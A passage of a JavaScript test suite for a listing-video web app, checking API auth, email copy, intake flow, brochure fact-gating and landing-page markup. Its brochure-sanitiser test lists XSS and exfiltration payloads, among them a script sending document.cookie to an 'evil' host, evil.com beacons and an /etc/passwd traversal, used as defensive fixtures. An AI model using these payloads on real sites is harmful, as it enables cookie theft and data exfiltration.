    [...src.matchAll(/(?:spawn|execFileSync)\(\s*([A-Za-z_.$]+)/g)].map((m) => ({ f, arg: m[1] }))
  );
  check('every spawned process is an ffmpeg binary',
    spawns.every(({ arg }) => /binary|ffmpeg|config\.ffmpeg/i.test(arg)));

  // Generation reaches Higgsfield one way only.
  const hf = sources.find(({ f }) => f.replaceAll('\\', '/').split('/').pop() === 'higgsfield.js').src;
  check('Higgsfield is called over HTTP', /await fetch\(url/.test(hf));
  check('auth uses the REST key header, not a bearer token or session',
    /`Key \$\{config\.higgsfield\.keyId\}:\$\{config\.higgsfield\.keySecret\}`/.test(hf));
  check('video generation posts to the dop endpoint', /'\/v1\/image2video\/dop'/.test(hf));

  // A deployment needs the two REST keys and a reachable origin — nothing else.
  const cfg = fsx.readFileSync(new URL('../server/config.js', import.meta.url), 'utf8');
  check('cinematic is gated on the REST keys alone',
    /higgsfieldConfigured = Boolean\(\s*config\.higgsfield\.keyId && config\.higgsfield\.keySecret\s*\)/.test(cfg));

  const pkg = JSON.parse(fsx.readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
  const deps = Object.keys(pkg.dependencies || {});
  check('no MCP or vendor SDK among dependencies',
    !deps.some((d) => /mcp|higgsfield|anthropic|openai/i.test(d)));
}

// --- studio first-run wiring ------------------------------------------------
{
  const fsx = await import('node:fs');
  const studio = fsx.readFileSync(new URL('../public/studio.html', import.meta.url), 'utf8');

  /* render() only writes innerHTML; draw() is what attaches handlers. boot()
     rendered the photos step directly on the no-listings path, so a brand-new
     account had a file input, drop zone and paste handler with no listeners —
     clicking "Upload photos" did nothing at all, forever. */
  check('boot() never renders a step without wiring it',
    !/}\s*else\s+render\(step/.test(studio));

  // The generate button was disabled on click and only re-enabled in catch, so
  // the success path left it dead.
  const gen = studio.slice(studio.indexOf('async function generate()'), studio.indexOf('function startPolling()'));
  check('generate() re-enables its button on every path', /finally\s*\{/.test(gen));
}

// --- the public link follows the building name ------------------------------
{
  const { slugify, listings } = await import('../server/store.js');
  const apiSrc = (await import('node:fs')).readFileSync(new URL('../server/routes/api.js', import.meta.url), 'utf8');
  const storeSrc = (await import('node:fs')).readFileSync(new URL('../server/store.js', import.meta.url), 'utf8');

  // The upload flow creates a listing as "Untitled tour" before it is named, so
  // a slug frozen at creation means the shared link and the downloaded reel are
  // both called untitled-tour — and that link is what goes on the sign.
  check('renaming a listing updates its slug', /listing\.slug = next;/.test(apiSrc));
  check('the previous slug is kept as an alias', /slugAliases/.test(apiSrc));
  check('bySlug resolves an aliased slug', /slugAliases \|\| \[\]\)\.includes\(slug\)/.test(storeSrc));
  check('slugify still de-duplicates', typeof slugify === 'function' && typeof listings.bySlug === 'function');
}

// --- brochure: model output is untrusted ------------------------------------
{
  const { _internals, BROCHURE_STYLES } = await import('../server/agents/brochure-agent.js');
  const { collectFacts } = await import('../server/facts.js');
  const { sanitiseHtml, enforceFacts } = _internals;

  /* Broker notes, photo filenames and lead text all reach this prompt, and the
     response is rendered in the broker's browser. Treat it as untrusted input. */
  const attacks = [
    ['<script>fetch("//evil/"+document.cookie)</script>', /evil|<script/i],
    ['<div onclick="x()">hi</div>', /onclick/i],
    ['<a href="javascript:alert(1)">x</a>', /javascript:/i],
    ['<img src="https://evil.com/beacon.gif">', /evil\.com/i],
    ['<style>@import url(https://evil.com/x.css);</style>', /evil\.com/i],
    ['<style>body{background:url(https://evil.com/x)}</style>', /evil\.com/i],
    ['<iframe src="https://evil.com"></iframe>', /<iframe|evil/i],
    ['<form action="https://evil.com"></form>', /<form|evil/i],
    ['<img src="/uploads/../../etc/passwd">', /\.\./],
  ];
  let leaks = 0;
  for (const [input, forbidden] of attacks) {
    if (forbidden.test(sanitiseHtml(input).html)) leaks += 1;
  }
  check('brochure sanitiser blocks scripts, beacons and exfiltration', leaks === 0);
  check('brochure sanitiser keeps our own images',
    sanitiseHtml('<img src="/uploads/img_a1.jpg">').html.includes('/uploads/img_a1.jpg'));

  /* A brochure is the document a broker hands a client. A number the broker
     never entered must not appear on it, no matter what the model wrote. */
  const listing = { name: 'X', address: '400 Riverview Dr', specs: [{ label: 'Available', value: '24,000 SF' }] };
  const facts = collectFacts(listing, null);
  const out = enforceFacts('<p>24,000 SF available. Asking $18.50 NNN, built in 1998.</p>', facts).html;
  check('an invented rent never reaches the brochure', !/18\.50/.test(out));
  check('an invented year never reaches the brochure', !/1998/.test(out));
  check('the broker\'s own number survives', /24,000 SF/.test(out));
  check('a stripped sentence does not leave a broken one', !/Asking\s+built/.test(out));
  check('brochure styles are offered', BROCHURE_STYLES.length >= 3);
}

// --- brochure: the fact gate must not eat the design ------------------------
{
  const { _internals } = await import('../server/agents/brochure-agent.js');
  const { collectFacts } = await import('../server/facts.js');
  const { enforceFacts } = _internals;
  const listing = { name: 'X', specs: [{ label: 'Available', value: '24,000 SF' }] };
  const facts = collectFacts(listing, null);

  /* A <style> block's contents sit between > and < like any text node, so a
     naive scan read "8.5in", "10.5pt" and "600" as unverified claims and
     deleted them — returning a completely unstyled page. */
  const withCss = '<style>.page{width:8.5in;font:10.5pt/1.5 serif;font-weight:600}h1{font-size:42pt}</style><p>24,000 SF available.</p>';
  const out = enforceFacts(withCss, facts).html;
  check('CSS lengths survive the fact gate', /8\.5in/.test(out) && /42pt/.test(out) && /10\.5pt/.test(out));
  check('prose is still checked alongside CSS', /24,000 SF/.test(out));

  // A spec row that loses its value leaves a visible hole in the document.
  const table = '<table><tr><td>Available</td><td>24,000 SF</td></tr><tr><td>Ceilings</td><td>14ft clear</td></tr></table>';
  const rows = enforceFacts(table, facts).html;
  check('a spec row emptied by the gate is removed entirely', !/Ceilings/.test(rows));
  check('a verified spec row is kept', /24,000 SF/.test(rows));
}

// --- listing intake is public and notifies Max --------------------------------
{
  const fsx = await import('node:fs');
  const intakeSrc = fsx.readFileSync(new URL('../server/routes/intake.js', import.meta.url), 'utf8');
  const mailSrc = fsx.readFileSync(new URL('../server/mailer.js', import.meta.url), 'utf8');
  const { notifyAddress, orderConfirmation, requestConfirmation, signInLink, requestDelivery, orderNotification } = await import('../server/mailer.js');

  check('intake does not hardcode hello@corridor.tours', !/hello@corridor\.tours/.test(intakeSrc));
  check('intake notifies via notifyAddress()', /notifyAddress\(\)/.test(intakeSrc));
  check('intake does not require square footage', !/square footage is required/.test(intakeSrc));
  check('intake does not mint a magic-link gate', !/issueLoginToken/.test(intakeSrc) && !/magicUrl/.test(intakeSrc));
  check('intake signs them in and points the client at the desk',
    /setSessionCookie\(res, account\.id\)/.test(intakeSrc) && /redirect: '\/listings'/.test(intakeSrc));

  const prevNotify = process.env.NOTIFY_EMAIL;
  delete process.env.NOTIFY_EMAIL;
  check('notifyAddress defaults to max@corridor.video', notifyAddress() === 'max@corridor.video');
  if (prevNotify !== undefined) process.env.NOTIFY_EMAIL = prevNotify;

  const confirm = orderConfirmation({ name: 'Ada', address: '1 Test St', photos: [] });
  check('broker confirmation has no sign-in / magic link',
    !/sign-in|sign in|magic|verify\?token|View your tours/i.test(`${confirm.subject}\n${confirm.html}`));
  check('broker confirmation subject and body are the professional listing copy',
    confirm.subject === 'We have your listing'
      && /Hi Ada,/.test(confirm.html)
      && /We have 1 Test St\./.test(confirm.html)
      && /We cut by hand from the photos you sent\./.test(confirm.html)
      && /It comes back in 48 hours\./.test(confirm.html)
      && /We work the cut with you until it's a video you'd send\./.test(confirm.html)
      && /max@corridor\.video/.test(confirm.html));
  check('broker confirmation does not sell, checkout, or intern-glue',
    !/see the cut before you owe/i.test(confirm.html)
      && !/first one free/i.test(confirm.html)
      && !/cinematic/i.test(confirm.html)
      && !/\/t\/demo/.test(confirm.html)
      && !/checkout/i.test(confirm.html));
  check('notify default is in the mailer, not a leftover tours address',
    /max@corridor\.video/.test(mailSrc) && !/hello@corridor\.tours/.test(mailSrc));
  check('shared shell dropped the generic cinematic-marketing footer',
    !/cinematic marketing for commercial real estate/i.test(mailSrc)
      && !/cinematic/i.test(mailSrc));
  check('shared shell uses the Detroit operator footer',
    /Corridor · Detroit ·/.test(confirm.html)
      && /max@corridor\.video/.test(confirm.html)
      && !/CRE marketing is boring/.test(confirm.html)
      && /#F7FAFD/.test(confirm.html));

  const requestConfirm = requestConfirmation({ name: 'Ada', address: '1 Test St', wants: ['video tour'], photos: [] });
  check('request confirmation uses the same broker voice',
    requestConfirm.subject === 'We have your listing'
      && /We have 1 Test St\./.test(requestConfirm.html)
      && /48 hours/i.test(requestConfirm.html)
      && !/see the cut before you owe/i.test(requestConfirm.html)
      && !/\/t\/demo/.test(requestConfirm.html)
      && !/monthly/i.test(requestConfirm.html));

  const link = signInLink({ email: 'broker@test.example' }, 'https://www.corridor.video/verify?token=abc', 20);
  check('sign-in email is Corridor, not a generic login template',
    link.subject === 'Your Corridor link'
      && /Open Corridor\./.test(link.html)
      && /One tap\. No password\./.test(link.html)
      && />Sign in</.test(link.html)
      && /Works once\. Expires in 20 minutes\./.test(link.html)
      && /ignore it/.test(link.html)
      && /Here's your link/.test(link.html) === false);

  const delivery = requestDelivery({ address: '1 Test St' }, {
    tourUrl: 'https://www.corridor.video/watch/1',
    downloadUrl: 'https://www.corridor.video/dl/1.mp4',
    note: '',
  });
  check('delivery email keeps watch and download in the branded shell',
    /It's ready\./.test(delivery.html)
      && /Watch the tour/.test(delivery.html)
      && /Download the MP4/.test(delivery.html)
      && /Corridor · Detroit ·/.test(delivery.html)
      && !/\/t\/demo/.test(delivery.html)
      && !/cinematic/i.test(delivery.html));

  const notify = orderNotification(
    {
      address: '1 Test St',
      name: 'Ada',
      email: 'ada@test.example',
      photos: [{ file: 'shot-a.jpg' }],
      accountId: 'acc_1',
      order: { amountCents: 20000, phoneWalk: false },
    },
    { photoUrls: ['https://corridor-nrny.onrender.com/uploads/shot-a.jpg'] },
  );
  check('operator notify is a labeled new-listing mail, not intern glue',
    notify.subject === 'New listing — 1 Test St'
      && /Name/.test(notify.html)
      && /Email/.test(notify.html)
      && /Address/.test(notify.html)
      && /Option/.test(notify.html)
      && /Price/.test(notify.html)
      && /Photo count/.test(notify.html)
      && /Account/.test(notify.html)
      && /ada@test\.example/.test(notify.html)
      && /\$200/.test(notify.html)
      && !/<table/i.test(notify.html)
      && !/New order —/.test(notify.subject)
      && !/cinematic/i.test(notify.html)
      && /Open the queue/.test(notify.html)
      && /https:\/\/corridor\.video\/requests/.test(notify.html)
      && /https:\/\/corridor\.video\/uploads\/shot-a\.jpg/.test(notify.html)
      && !/onrender\.com/.test(notify.html)
      && /Corridor · Detroit ·/.test(notify.html));

  check('intake emails the broker confirmation after the order is saved',
    /orderConfirmation\(request\)/.test(intakeSrc)
      && /sendMail\(\{ to: email, subject: confirm\.subject/.test(intakeSrc));
}

// --- property intake --------------------------------------------------------
{
  const fsx = await import('node:fs');
  const pub = fsx.readFileSync(new URL('../server/routes/public.js', import.meta.url), 'utf8');
  const apiSrc = fsx.readFileSync(new URL('../server/routes/api.js', import.meta.url), 'utf8');
  const { mailStatus, sendMail } = await import('../server/mailer.js');

  /* A submission is somebody's job, not a cache entry. It must be durable
     before any mail is attempted, and the response must not depend on mail
     succeeding — a provider outage presenting as "your request failed" to
     someone who just uploaded forty photos loses the customer silently. */
  const intake = pub.slice(pub.indexOf("publicApi.post('/requests'"), pub.indexOf("publicApi.get('/tours/:slug'"));
  check('a request is persisted durably on arrival', /saveNow\(\)/.test(intake));
  check('the response is sent before mail is attempted',
    intake.indexOf('res.status(201)') < intake.indexOf('sendMail'));
  check('a spam honeypot is checked', /body\.website/.test(intake));
  check('the intake route is rate limited', /intakeLimiter/.test(intake));
  check('an email address is required', /valid email address is required/.test(intake));

  // Never throws: the caller decides what a failed send means.
  const sent = await sendMail({ to: 'x@example.com', subject: 's', html: 'h' });
  check('sendMail reports failure instead of throwing', sent.ok === false && typeof sent.error === 'string');
  check('mailStatus explains why it is off when unconfigured',
    mailStatus().configured === true || typeof mailStatus().reason === 'string');

  /* Marking delivered must follow the email actually being accepted. A request
     shown as delivered when nothing left the building leaves a customer waiting
     forever on work that was finished days ago. */
  const deliver = apiSrc.slice(apiSrc.indexOf("api.post('/requests/:id/deliver'"), apiSrc.indexOf("api.delete('/requests/:id'"));
  check('delivery bails out before marking delivered when the send fails',
    deliver.indexOf('if (!sent.ok)') < deliver.indexOf("request.status = 'delivered'"));
}

// --- intake photos must be visible and usable -------------------------------
{
  const fsx = await import('node:fs');
  const queue = fsx.readFileSync(new URL('../public/requests.html', import.meta.url), 'utf8');
  const apiSrc = fsx.readFileSync(new URL('../server/routes/api.js', import.meta.url), 'utf8');

  /* The queue's photo tiles are <a> elements. An inline box ignores
     aspect-ratio, so the tile collapsed to a sliver and the broker's photos
     rendered as empty strips — the files were fine, the operator just could not
     see them. */
  const thumbRule = queue.slice(queue.indexOf('.thumb {'), queue.indexOf('}', queue.indexOf('.thumb {')));
  check('queue photo tiles are block-level so aspect-ratio applies', /display:\s*block/.test(thumbRule));
  check('queue photo tiles still declare an aspect ratio', /aspect-ratio/.test(thumbRule));
  check('each tile links to the full-size file', /<a class="thumb" href/.test(queue));

  /* Without a bridge from request to listing, the operator downloads every
     photo and re-uploads it by hand to produce anything. */
  const bridge = apiSrc.slice(apiSrc.indexOf("api.post('/requests/:id/create-listing'"),
                              apiSrc.indexOf("api.delete('/requests/:id'"));
  check('a request can become a production listing', bridge.length > 0);
  check('the listing reuses the uploaded files rather than re-copying them', /file: p\.file/.test(bridge));
  check('broker-entered specs carry over as the fact whitelist', /specs: \[/.test(bridge));
  check('creating twice reuses the listing instead of duplicating it', /reused: true/.test(bridge));
  check('the request is linked back to its listing', /request\.listingId = listing\.id/.test(bridge));
}

// --- the turnaround we promise ----------------------------------------------
{
  const fsx = await import('node:fs');
  const files = ['../public/index.html', '../server/mailer.js'];
  const stale = files.filter((f) =>
    /two business days|2 business days|24 hours or less/i.test(fsx.readFileSync(new URL(f, import.meta.url), 'utf8'))
  );
  // A promise that differs between the landing page and the email is one the
  // customer will notice before we do. The live promise is 48 hours.
  check('no stale turnaround promise remains', stale.length === 0);
  const promised = files.filter((f) =>
    /48 hours/i.test(fsx.readFileSync(new URL(f, import.meta.url), 'utf8'))
  );
  check('48-hour turnaround stated on landing and confirmation email', promised.length === 2);
}

// --- marketing homepage stays a light illustrated landing page --------------
{
  const fsx = await import('node:fs');
  const landing = fsx.readFileSync(new URL('../public/index.html', import.meta.url), 'utf8');
  const heroPath = new URL('../public/hero-detroit.png', import.meta.url);
  const basePath = new URL('../public/hero-detroit-base.png', import.meta.url);
  const cloudA = new URL('../public/hero-clouds-a.png', import.meta.url);
  const cloudB = new URL('../public/hero-clouds-b.png', import.meta.url);
  check('hero illustration is a real full-quality PNG in public/', fsx.existsSync(heroPath) && fsx.statSync(heroPath).size > 2_000_000 && heroPath.pathname.endsWith('.png'));
  const loopPath = new URL('../public/hero-detroit-loop.mp4', import.meta.url);
  check('hero loop is the hi-res ping-pong plate', fsx.existsSync(loopPath) && fsx.statSync(loopPath).size > 4_000_000);
  check('cut-out cloud layer assets were deleted', !fsx.existsSync(basePath) && !fsx.existsSync(cloudA) && !fsx.existsSync(cloudB));
  check('homepage uses the original static illustrated Detroit riverfront', /hero-detroit\.jpg/.test(landing) && !/hero-detroit-base\.png/.test(landing) && !/hero-clouds-a\.png/.test(landing) && !/Andrew Heneen/.test(landing));
  const phoneWebp = new URL('../public/hero-detroit-phone.webp', import.meta.url);
  const phoneAvif = new URL('../public/hero-detroit-phone.avif', import.meta.url);
  check('phone hero is a compressed recut of the same painting',
    fsx.existsSync(phoneWebp) && fsx.statSync(phoneWebp).size < 200_000
      && fsx.existsSync(phoneAvif) && fsx.statSync(phoneAvif).size < 120_000
      && /hero-detroit-phone\.webp/.test(landing) && /hero-detroit-phone\.avif/.test(landing));
  check('site type is Bricolage Grotesque from Google Fonts',
    /fonts\.googleapis\.com\/css2\?family=Bricolage\+Grotesque/.test(landing)
      && /--font:\s*"Bricolage Grotesque"/.test(landing)
      && /--sans:\s*var\(--font\)/.test(landing)
      && /--serif:\s*var\(--font\)/.test(landing)
      && !/font-family:\s*"Archivo"/.test(landing)
      && !/font-family:\s*"Instrument Serif"/.test(landing)
      && !/\/fonts\/instrument-serif\.woff2/.test(landing)
      && !/\/fonts\/archivo\.woff2/.test(landing));
  check('phone type sits on the floor on a full first screen', /height:\s*100svh/.test(landing) && /justify-content:\s*flex-start/.test(landing) && /bottom:\s*18svh/.test(landing) && /left:\s*16%/.test(landing) && !/top:\s*6\.4rem/.test(landing) && !/min-height:\s*68svh/.test(landing));
  check('hero is a CSS cover background, not a pixelated or srcset image', /background-size:\s*cover/.test(landing) && !/background-size:\s*175%\s*auto/.test(landing) && !/background-size:\s*auto\s*100%/.test(landing) && !/image-rendering:\s*pixelated/.test(landing) && !/srcset/.test(landing));
  check('hero is full-bleed with the floor in frame', /min-height:\s*100vh/.test(landing) && /min-height:\s*100dvh/.test(landing) && /background-size:\s*cover/.test(landing) && /background-position:\s*40%\s*56%/.test(landing) && /background-position:\s*30%\s*62%/.test(landing) && /image-rendering:\s*auto/.test(landing) && !/street-patch/.test(landing) && !/background-position:\s*22%/.test(landing) && !/background-position:\s*46%\s*38%/.test(landing) && !/background-position:\s*48%\s*28%/.test(landing) && !/background-position:\s*50%\s*72%/.test(landing) && !/background-position:\s*46%\s*90%/.test(landing));
  check('hero owns the first viewport so the next section cannot peek', /height:\s*100vh/.test(landing) && /height:\s*100dvh/.test(landing) && /overflow:\s*hidden/.test(landing));
  check('first viewport is the full-bleed riverfront, not a boxed hero', /class="street"/.test(landing) && /class="street-art"/.test(landing) && !/<figure class="hero-art">/.test(landing));
  check('illustration is not a fixed backdrop under the whole page', !/class="scene"/.test(landing) && !/\.scene\s*\{[^}]*position:\s*fixed/.test(landing));
  check('headline sits on the empty floor, with no fold pitch', /class="sky-board"/.test(landing) && /class="sky-line"/.test(landing) && /left:\s*clamp\(18%,\s*22vw,\s*26%\)/.test(landing) && /bottom:\s*clamp\(26vh,\s*30vh,\s*34vh\)/.test(landing) && !/top:\s*5\.6rem/.test(landing) && /justify-content:\s*flex-start/.test(landing) && /max-width:\s*14ch/.test(landing) && !/class="sky-lead"/.test(landing) && !/class="pitch"/.test(landing) && !/We make a video of your listing/.test(landing) && !/top:\s*max\(88px,\s*15vh\)/.test(landing) && !/nav-send/.test(landing));
  check('hero aria-label describes the empty industrial floor', /aria-label="Empty industrial floor, glass wall, one shaft of light\."/.test(landing) && !/Illustrated Detroit riverfront/.test(landing) && !/Renaissance Center/.test(landing));
  check('street-art fallback is cool grey, not sky', /background-color:\s*#73787E/.test(landing) && !/\.street-art[\s\S]*?background-color:\s*#B8D7EB/.test(landing));
  check('wordmark is the site sans spelling Corridor, no play mark', /class="wordmark"/.test(landing) && />Corridor</.test(landing) && /font-family:\s*var\(--sans\)/.test(landing) && !/wordmark-play/.test(landing) && !/class="mark-c"/.test(landing) && !/class="rest"/.test(landing) && !/M2\.4 23V10\.6/.test(landing));
  check('Detroit line is a bottom-right hairline caption', /class="geo"/.test(landing) && /border-top:/.test(landing) && /text-align:\s*right/.test(landing));
  check('light haze reads type without darkening the painting', /class="street-haze"/.test(landing) && /rgba\(247,\s*244,\s*237/.test(landing) && !/backdrop-filter:\s*blur/.test(landing));
  check('pricing lives on a sampled color band after the riverfront', /band-sky/.test(landing) && /band-paper/.test(landing));
  check('footer is sky, not a brown slab', /<footer class="band-sky">/.test(landing) && !/<footer class="band-stone">/.test(landing));
  check('no glass cards or dim overlay on the illustration', !/card-lite/.test(landing) && !/glass-strip/.test(landing) && !/backdrop-filter:\s*blur\(10px\)/.test(landing));
  check('homepage stays on the light sampled palette', /background:\s*#F7F4ED/.test(landing) && /background:\s*#B8D7EB/.test(landing));
  check('primary blue is still the brand color', /#1E5AA8/.test(landing));
  check('illustration palette is on the homepage', /#B8D7EB/.test(landing) && /#D47A54/.test(landing) && /#C8C2B4/.test(landing) && /#2B2B2B/.test(landing));
  check('moodboard filler was not copied into the product', !/local roots|sustainable|LIST YOUR PROPERTY|corridor\.co/i.test(landing));
  const skyCopy = landing.slice(landing.indexOf('class="street"'), landing.indexOf('id="what"') > -1 ? landing.indexOf('id="what"') : landing.indexOf('id="pricing"'));
  check('hero copy wraps in the left haze, then a quieter fix', /class="sky-line"/.test(landing) && /<h1>CRE marketing is boring\.<\/h1>/.test(landing) && /class="fix">So we fixed it\./.test(landing) && /class="offer">Photos you already have\. 48 hours\. \$200\./.test(landing) && /\.sky-line h1\s*\{[^}]*font-family:\s*var\(--sans\)/.test(landing) && /clamp\(1\.5rem,\s*4\.6vw,\s*4\.4rem\)/.test(landing) && !/\.sky-line h1\s*\{[^}]*white-space:\s*nowrap/.test(landing) && !/\.sky-line h1\s*\{[^}]*7rem/.test(landing) && !/We make a video of your listing/.test(landing) && !/They walk the building/.test(landing) && !/id="boring-word"/.test(landing));
  check('hero has no cinematic and no old photos-in subhead', !/cinematic/i.test(skyCopy) && !/Photos in/.test(skyCopy));
  check('title and meta match the new hero, no cinematic', /<title>Corridor — CRE marketing is boring\. So we fixed it\./.test(landing) && /name="description" content="You still ship a photo dump and a PDF\. We cut a listing video from the photos you already have\. You send it\. The other side walks it on their phone, then they book the showing\. Detroit founded\. We cut a listing anywhere\."/.test(landing) && !/<title>[^<]*cinematic/i.test(landing) && !/name="description" content="[^"]*cinematic/i.test(landing));
  check('hero is a still riverfront, no walker figures', !/class="sidewalk"/.test(landing) && !/class="walker/.test(landing) && !/@keyframes stroll-/.test(landing) && !/@keyframes stride/.test(landing) && !/billboard/.test(landing));
  check('footer has no photograph credit', !/Andrew Heneen/.test(landing) && !/Wikimedia Commons/.test(landing));
  check('nav is Pricing, FAQ, Sign in, and Create account',
    /href="#pricing"/.test(landing) && /href="#faq"/.test(landing)
      && /class="nav-wide" href="\/listings">Sign in</.test(landing)
      && /class="nav-wide" href="\/listings#create">Create account</.test(landing)
      && !/href="#product"/.test(landing) && !/href="#what"/.test(landing)
      && !/data-open-auth/.test(landing) && !/>Account</.test(landing)
      && !/type="password"/.test(landing) && !/href="\/studio"/.test(landing));
  const whatCopy = landing.slice(landing.indexOf('id="what"'), landing.indexOf('id="pricing"'));
  check('What we do is the walk from photos you already have',
    /<h2>What we do<\/h2>/.test(landing)
      && /You still ship a photo dump and a PDF/.test(whatCopy)
      && /Nobody walks the building/.test(whatCopy)
      && /The brochure dies in an inbox/.test(whatCopy)
      && /We cut a listing video from the photos you already have/.test(whatCopy)
      && /You send it/.test(whatCopy)
      && /walks it on their phone, then they book the showing/.test(whatCopy)
      && !/73%/.test(whatCopy)
      && !/NAR, 2024 Profile of Home Buyers and Sellers/.test(whatCopy)
      && !/403%/.test(whatCopy)
      && !/CRE study/i.test(whatCopy)
      && !/villain/i.test(whatCopy)
      && !/boring CRE marketing/i.test(whatCopy)
      && !/the mission/.test(whatCopy)
      && !/—/.test(whatCopy)
      && !/cinematic/i.test(whatCopy)
      && !/gamification/i.test(whatCopy)
      && !/founder/i.test(whatCopy)
      && !/<article/.test(whatCopy)
      && landing.indexOf('id="what"') < landing.indexOf('id="pricing"'));
  check('landing has no auth modal or password field',
    !/email me a link/i.test(landing) && !/auth-modal/.test(landing) && !/type="password"/.test(landing));
  check('landing points listings at the desk, not a homepage form',
    /href="\/listings"/.test(landing) && !/id="intake-form"/.test(landing));
  check('hero motion is a muted riverfront loop, not CSS cloud layers',
    /class="street-loop"/.test(landing)
      && /hero-detroit-loop\.mp4/.test(landing)
      && /playsinline/.test(landing)
      && /prefers-reduced-motion:\s*reduce/.test(landing)
      && !/rel="preload"[^>]*hero-detroit-loop/.test(landing)
      && /defaultPlaybackRate = 0\.75/.test(landing)
      && /playbackRate = 0\.75/.test(landing)
      && !/playbackRate = 0\.4/.test(landing)
      && !/playbackRate\s*=\s*-/.test(landing)
      && !/class="sky-drift"/.test(landing) && !/class="painted/.test(landing) && !/@keyframes painted-drift/.test(landing) && !/hero-clouds-/.test(landing) && !/\.street-art\s*\{[^}]*animation/.test(landing) && !/class="puff/.test(landing));
  const loopTag = landing.slice(landing.indexOf('class="street-loop"'), landing.indexOf('</video>'));
  check('hero loop is silent, cover-cropped, and has no controls',
    /muted/.test(loopTag) && /autoplay/.test(loopTag) && /loop/.test(loopTag)
      && /preload="auto"/.test(loopTag) && /poster="\/hero-detroit\.jpg"/.test(loopTag)
      && !/\scontrols/.test(loopTag)
      && /object-fit:\s*cover/.test(landing) && /object-position:\s*40%\s*56%/.test(landing)
      && /object-position:\s*30%\s*62%/.test(landing)
      && !/object-position:\s*46%\s*38%/.test(landing) && !/object-position:\s*48%\s*28%/.test(landing)
      && !/object-position:\s*50%\s*72%/.test(landing)
      && /pointer-events:\s*none/.test(landing));
  check('hero is full-bleed cover, no scroll dolly',
    !/street-pin/.test(landing) && !/street-stage/.test(landing) && !/148vh/.test(landing)
      && !/src="\/hero-detroit-scroll\.mp4"/.test(landing));
  check('hero has no wave or water overlays', !/class="river"/.test(landing) && !/class="wave-row/.test(landing) && !/@keyframes river-flow/.test(landing) && !/class="water-shimmer"/.test(landing));
  check('process cards and side gutters were cut', !/class="gutter"/.test(landing) && !/<h2>The walk<\/h2>/.test(landing) && !/<h2>The showing<\/h2>/.test(landing) && !/<h2>The listing<\/h2>/.test(landing) && !/id="proof"/.test(landing) && !/id="product"/.test(landing));
  check('geography is one Detroit-founded line', /Detroit founded\. We cut a listing anywhere\./.test(landing) && !/Detroit based/.test(landing) && !/we work with anyone around the world/i.test(landing) && !/Metro Detroit brokers, first/.test(landing));
  check('ticker and brochure sections were cut', !/corridorMarquee/.test(landing) && !/Please see attached/.test(landing) && !/Included every time/.test(landing) && !/eight-figure/.test(landing) && !/id="brokerages"/.test(landing));
  check('short FAQ sits after prices, with no inquire form after it', /id="faq"/.test(landing) && /What do I send/.test(landing) && /When do I pay/.test(landing) && /Will it look AI \/ fake/.test(landing) && /Cut from their photos\. We work it until it.s a video they.d send/.test(landing) && !/Who owns the tour/.test(landing) && (landing.match(/<details>/g) || []).length === 4 && landing.indexOf('id="faq"') > landing.indexOf('id="pricing"') && !/id="intake"/.test(landing));
  check('cut by hand from your photos appears once, in the FAQ', (landing.match(/cut by hand from your photos/g) || []).length === 1 && landing.indexOf('cut by hand from your photos') > landing.indexOf('id="faq"'));
  check('no demo tour link on the public page', !/\/t\/demo/.test(landing) && !/the space is real/.test(landing) && !/This is what your listing looks like/.test(landing));
  check('pricing is exactly three cards with no SKU toggle',
    /class="price-card"/.test(landing)
      && /price-grid-3/.test(landing)
      && !/price-grid-4/.test(landing)
      && !/id="price-once"/.test(landing)
      && !/class="price-tab"/.test(landing)
      && !/id="price-month"/.test(landing)
      && !/One-time/.test(landing)
      && !/Monthly/.test(landing)
      && /<h3>\$200<\/h3>/.test(landing)
      && !/<h3>\$350<\/h3>/.test(landing)
      && /\$750 <span class="per">\/ month<\/span>/.test(landing)
      && /<h3>Custom<\/h3>/.test(landing)
      && /One listing/.test(landing)
      && !/Five-pack/.test(landing)
      && !/Phone walk/.test(landing)
      && />Shop</.test(landing)
      && /Four listings/.test(landing)
      && /Unused roll 60 days, cap 8, extra \$200/.test(landing)
      && /The month is the shop/.test(landing)
      && /Photos you have/.test(landing)
      && /Pay when it.s a cut you.d send/.test(landing)
      && /48 hours/.test(landing)
      && /mailto:max@corridor\.video/.test(landing)
      && />Write Max</.test(landing)
      && />Book a call</.test(landing)
      && !/Start a listing/.test(landing)
      && !/href="\/listings"/.test(landing.slice(landing.indexOf('id="pricing"'), landing.indexOf('id="faq"')))
      && /<p class="plan">Enterprise<\/p>/.test(landing)
      && /Volume, a desk, a number that isn.t on a card/.test(landing)
      && !/class="price-quote"/.test(landing)
      && !/class="was"/.test(landing)
      && !/class="ask"/.test(landing)
      && !/\$400/.test(landing)
      && !/\$1,000/.test(landing)
      && (landing.match(/<article class="price-card/g) || []).length === 3
      && !/\$499/.test(landing) && !/\$9,?999/.test(landing)
      && !/gamification/i.test(landing)
      && !/room-by-room|analytics|a game/i.test(landing.slice(landing.indexOf('id="pricing"'), landing.indexOf('id="faq"')))
      && !/checkout|stripe/i.test(landing.slice(landing.indexOf('id="pricing"'), landing.indexOf('id="faq"')))
      && !/half forever/i.test(landing)
      && !/yearly|20%|\/ year/i.test(landing.slice(landing.indexOf('id="pricing"'), landing.indexOf('id="faq"')))
      && !/\blicense\b/i.test(landing.slice(landing.indexOf('id="pricing"'), landing.indexOf('id="faq"'))));
  check('cut-until-you-would-send is the closer, not the old owe slogan',
    /We work the cut with you until it.s a video you.d send/.test(landing)
      && /One listing: after the video is sendable/.test(landing)
      && /If it isn.t, we keep working or we don.t bill/.test(landing)
      && /Shop: \$750 a month for four/.test(landing)
      && /The month is the shop, not pay-per-cut/.test(landing)
      && /class="note">We work the cut with you until it.s a video you.d send/.test(landing)
      && !/phone walk/i.test(landing)
      && !/five-pack/i.test(landing)
      && !/see the cut before you owe/i.test(landing)
      && !/owe anything/i.test(landing)
      && !/After you see the cut/i.test(landing)
      && !/invoiced after delivery/i.test(landing));
  check('no first-one-free on the public site', !/first one free|first-one-free|first tour free/i.test(landing));
  check('no full-refund language', !/full refund/i.test(landing));
  check('homepage Send-a-listing form is gone',
    !/id="intake-form"/.test(landing)
      && !/id="intake"/.test(landing)
      && !/Send a listing/.test(landing)
      && !/6432 Woodward/.test(landing));
  check('footer is Detroit and max@corridor.video, no intern line', /DETROIT/.test(landing) && /MAX@CORRIDOR\.VIDEO/.test(landing) && !/STARTED BY ONE CRE INTERN/.test(landing) && !/MAX@CORRIDOR\.TOURS/.test(landing));
  check('homepage footer links Privacy and Terms', /href="\/privacy"/.test(landing) && /href="\/terms"/.test(landing));
  check('FAQ speed line matches one listing vs shop recuts',
    /How fast is it back/.test(landing)
